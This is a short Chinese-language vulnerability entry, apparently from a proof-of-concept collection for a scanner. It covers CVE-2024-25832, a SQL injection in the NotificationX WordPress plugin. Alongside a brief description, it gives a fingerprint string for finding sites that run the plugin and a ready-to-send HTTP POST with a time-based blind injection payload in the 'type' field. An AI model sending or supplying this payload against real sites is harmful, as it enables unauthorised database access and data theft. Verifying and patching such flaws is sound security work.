﻿# WordPress Plugin SQL注入漏洞

> 更新时间：2024-03-19

> 漏洞编号：CVE-2024-25832

> 漏洞说明：WordPress Plugin是一个可以增强和扩展WordPress网站功能的软件，它是基于WordPress平台开发的。这些插件可以添加新的功能，改变网站外观，增强安全性等。一般来说，它们可以用来优化SEO、集成社交媒体、创建联系表单、生成缩略图、添加广告等等。

该产品存在SQL注入漏洞。该漏洞源于对用户提供的参数转义不充分以及对现有 SQL 查询缺乏充分的准备，很容易通过“type”参数受到 SQL 注入攻击。

> 漏洞特征：body="/wp-content/plugins/notificationx"

> 验证脚本：HTTP

```
POST /wp-json/notificationx/v1/analytics HTTP/1.1
Content-Type: application/json

{"nx_id": "1","type": "clicks`=1 and 1=sleep(5)-- -"}
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：WordPress Plugin SQL注入漏洞.poc

